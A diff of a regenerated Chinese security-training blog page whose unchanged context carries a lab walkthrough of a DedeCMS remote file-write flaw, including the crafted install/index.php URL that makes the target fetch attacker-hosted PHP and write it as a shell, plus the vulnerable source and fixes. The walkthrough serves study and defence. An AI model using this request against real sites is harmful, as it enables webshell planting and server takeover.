@@ -38,7 +38,7 @@
     <!--[if lt IE 9]>
     <div class="browsehappy">
         当前网页 <strong>不支持</strong>
-        你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/" target="_blank" rel="noopener">升级你的浏览器</a>.
+        你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.
     </div>
     <![endif]-->
 
@@ -84,7 +84,7 @@
                     
                         <a href="https://www.facebook.com/profile.php?id=100011855760219&amp;ref=bookmarks" class="qqweibo" target="_blank"><b>■</b> Facebook</a>
                     
-                    <a href="javascript: void(0);" target="_blank" rel="noopener" class="wechat">
+                    <a href="javascript: void(0);" class="wechat">
                         <b>■</b>
                         公众号
                         <span class="popover">
@@ -125,10 +125,10 @@
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在目标机上查看【C: /phpstudy /www/data/admin/config update. php<br>】,已经由原来的内容变为空的内容。如图所示<br><img src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/1.png" alt="图1"><br><img src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/2.png" alt="图2"></p>
 <p>在192.168.1.2打开 phpstudy在【c/ phpstudy/www】下建立【dedecms/ demonata. a. txt】,写入【<?php phpinfo():?>】,也可以是一句话。如图所示<br><img src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/3.png" alt="图3"></p>
 <p>访问【http: //192.168.1. 3/install/index. php?<br>step=11&amp;inslockfile=a&amp;s_lang=a&amp;install_demo_nam<br>e=../data/tchg. php&amp;updatehost=http: //192.168.1<br>2/】,可以看到出现了存在,说明 phpinfo已经写进去<br>了。如图所示<br><img src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/4.png" alt="图4"></p>
-<p>访问 【<a href="http://192.168.1.3/data/tchg.php】,可以看到" target="_blank" rel="noopener">http://192.168.1.3/data/tchg.php】,可以看到</a> phpinfo页面说明真的写进去了。如图所示<br><img src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/5.png" alt="图5"></p>
+<p>访问 【<a href="http://192.168.1.3/data/tchg.php】,可以看到">http://192.168.1.3/data/tchg.php】,可以看到</a> phpinfo页面说明真的写进去了。如图所示<br><img src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/5.png" alt="图5"></p>
 <p>漏洞产生的原因发生在安装页面【c:/ phpstudy/www/install/index. php】,如果接收到的参数【step=11】,然后包含【C: /phpstudy /www/data/admin/config_update. php】。查看【 config_update.php】里面定义了【updateHost】变量。前面已经把这个文件里的内容绐清空了。这里利用了php5.2的特性,全局变量get可以赋值这样就控制了上传的内容,达到了写shel的目的。如图所示<br><img src="/images/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BDedecms%E8%BF%9C%E7%A8%8B%E5%86%99%E6%96%87%E4%BB%B6/6.png" alt="图6"></p>
 <p>漏洞修复,升级php版本,或者删除安装文件,或者把php.ini文件中的【register_globals】设置为off</p>
-<h2 id="加深理解"><a href="#加深理解" class="headerlink" title="加深理解"></a>加深理解</h2><p>引用大佬博客。写的很清楚。<br><a href="http://blog.sina.com.cn/s/blog_12f7f19600102wimx.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_12f7f19600102wimx.html</a></p>
+<h2 id="加深理解"><a href="#加深理解" class="headerlink" title="加深理解"></a>加深理解</h2><p>引用大佬博客。写的很清楚。<br><a href="http://blog.sina.com.cn/s/blog_12f7f19600102wimx.html">http://blog.sina.com.cn/s/blog_12f7f19600102wimx.html</a></p>
 <h2 id="自己对他的一点理解"><a href="#自己对他的一点理解" class="headerlink" title="自己对他的一点理解"></a>自己对他的一点理解</h2><p>这是一个典型的cms模板的漏洞了，就以我现在的水平（我也才学了半年的信息安全），感觉这种漏洞应该是属于审计出来的，应该是靠src去挖掘，我现在的代码水平不是很好，而且我还是先从OWASP TOP10开始慢慢摸索的渗透，对于这种cms的漏洞不是很懂，因为感觉需要一定的代码水平才能去理解，所以先把源码存下来，后面学了代码再去做一遍注释吧。</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($step==<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">require_once(‘../data/admin/config_update.php’);</span><br><span class="line"></span><br><span class="line">$rmurl = $updateHost.”dedecms/demodata.&#123;$s_lang&#125;.txt”;</span><br><span class="line"></span><br><span class="line">echo $rmurl;</span><br><span class="line"></span><br><span class="line">$sql_content = file_get_contents($rmurl);</span><br><span class="line"></span><br><span class="line">$fp = fopen($install_demo_name,’w’);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(fwrite($fp,$sql_content))</span><br><span class="line"></span><br><span class="line">echo ‘  &lt;font color=”green”&gt;[√]&lt;<span class="regexp">/font&gt; 存在(您可以选择安装进行体验)’;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">else</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">echo ‘  &lt;font color=”red”&gt;[×]&lt;/</span>font&gt; 远程获取失败’;</span><br><span class="line"></span><br><span class="line">unset($sql_content);</span><br><span class="line"></span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">exit();</span><br></pre></td></tr></table></figure>
 
@@ -152,11 +152,11 @@
   <div class="article-share clearfix text-center">
     <div class="share-area">
       <span class="share-txt">分享到：</span>
-      <a href="javascript: window.open(' target="_blank" rel="noopener"http://service.weibo.com/share/share.php?url=' + encodeURIComponent(location.href) + '&title=' + document.title + '&language=zh_cn');" class="share-icon weibo"></a>
-      <a href="javascript: alert(' target="_blank" rel="noopener"请复制链接到微信并发送');" class="share-icon wechat"></a>
-      <a href="javascript: window.open(' target="_blank" rel="noopener"http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=' + encodeURIComponent(location.href) + '&title=' + document.title);" class="share-icon qqzone"></a>
-      <a href="javascript: window.open(' target="_blank" rel="noopener"http://connect.qq.com/widget/shareqq/index.html?url=' + encodeURIComponent(location.href) + '&desc=Jelon个人博客&title=' + document.title + '&callback=' + encodeURIComponent(location.href));" class="share-icon qq"></a>
-      <a href="javascript: window.open(' target="_blank" rel="noopener"http://shuo.douban.com/!service/share?href=' + encodeURIComponent(location.href) + '&name=' + document.title + '&text=' + document.title);" class="share-icon douban"></a>
+      <a href="javascript: window.open('http://service.weibo.com/share/share.php?url=' + encodeURIComponent(location.href) + '&title=' + document.title + '&language=zh_cn');" class="share-icon weibo"></a>
+      <a href="javascript: alert('请复制链接到微信并发送');" class="share-icon wechat"></a>
+      <a href="javascript: window.open('http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=' + encodeURIComponent(location.href) + '&title=' + document.title);" class="share-icon qqzone"></a>
+      <a href="javascript: window.open('http://connect.qq.com/widget/shareqq/index.html?url=' + encodeURIComponent(location.href) + '&desc=Jelon个人博客&title=' + document.title + '&callback=' + encodeURIComponent(location.href));" class="share-icon qq"></a>
+      <a href="javascript: window.open('http://shuo.douban.com/!service/share?href=' + encodeURIComponent(location.href) + '&name=' + document.title + '&text=' + document.title);" class="share-icon douban"></a>
     </div>
   </div>
 
@@ -167,9 +167,9 @@
     
     <span class="prev fl">
         上一篇<br >
-        <a href="/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BExponent%20cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+        <a href="/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BCVE-2017-6823%20Fiyo%20CMS%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
             
-                铁三训练营之Exponent cms任意文件上传漏洞
+                铁三训练营之CVE-2017-6823 Fiyo CMS权限提升
             
         </a>
     </span>
@@ -178,9 +178,9 @@
     
     <span class="next fr">
         下一篇<br >
-        <a href="/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BFiyo%20CMS%20sql%E6%B3%A8%E5%85%A5/">
+        <a href="/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BExponent%20cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
             
-                铁三训练营之SQL注入漏洞
+                铁三训练营之Exponent cms任意文件上传漏洞
             
         </a>
     </span>
@@ -247,9 +247,9 @@
         </li>
       </ul>
       <div class="page-nav">
-        <a href="javascript: void(0);" target="_blank" rel="noopener" class="item">1</a>
-        <a href="javascript: void(0);" target="_blank" rel="noopener" class="item">2</a>
-        <a href="javascript: void(0);" target="_blank" rel="noopener" class="item current">3</a>
+        <a href="javascript: void(0);" class="item">1</a>
+        <a href="javascript: void(0);" class="item">2</a>
+        <a href="javascript: void(0);" class="item current">3</a>
       </div>
     </section>
     -->
@@ -277,6 +277,11 @@
 <ul class="widget-bd">
     
     <li>
+        <a href="/categories/%E6%AF%94%E8%B5%9B%E6%97%A5%E8%AE%B0/">比赛日记</a>
+        <span class="badge">(2)</span>
+    </li>
+    
+    <li>
         <a href="/categories/%E6%B8%97%E9%80%8F%E6%97%A5%E5%BF%97/">渗透日志</a>
         <span class="badge">(3)</span>
     </li>
@@ -287,28 +292,23 @@
     </li>
     
     <li>
-        <a href="/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/">奇技淫巧</a>
-        <span class="badge">(10)</span>
-    </li>
-    
-    <li>
-        <a href="/categories/%E6%AF%94%E8%B5%9B%E6%97%A5%E8%AE%B0/">比赛日记</a>
-        <span class="badge">(2)</span>
-    </li>
-    
-    <li>
-        <a href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
-        <span class="badge">(9)</span>
-    </li>
-    
-    <li>
         <a href="/categories/python/">python</a>
         <span class="badge">(5)</span>
     </li>
     
     <li>
+        <a href="/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/">奇技淫巧</a>
+        <span class="badge">(10)</span>
+    </li>
+    
+    <li>
         <a href="/categories/PHP/">PHP</a>
         <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
+        <span class="badge">(9)</span>
     </li>
     
     <li>
@@ -335,6 +335,8 @@
         <!-- 文章标签 -->
 <div class="widget-bd tag-wrap">
   
+    <a class="tag-item" href="/tags/%E6%AF%94%E8%B5%9B/" title="比赛">比赛 (2)</a>
+  
     <a class="tag-item" href="/tags/%E6%B8%97%E9%80%8F/" title="渗透">渗透 (16)</a>
   
     <a class="tag-item" href="/tags/python/" title="python">python (7)</a>
@@ -345,11 +347,9 @@
   
     <a class="tag-item" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">内网渗透 (5)</a>
   
-    <a class="tag-item" href="/tags/%E6%AF%94%E8%B5%9B/" title="比赛">比赛 (2)</a>
+    <a class="tag-item" href="/tags/PHP/" title="PHP">PHP (1)</a>
   
     <a class="tag-item" href="/tags/Python/" title="Python">Python (1)</a>
-  
-    <a class="tag-item" href="/tags/PHP/" title="PHP">PHP (1)</a>
   
     <a class="tag-item" href="/tags/%E7%88%AC%E8%99%AB/" title="爬虫">爬虫 (1)</a>
   
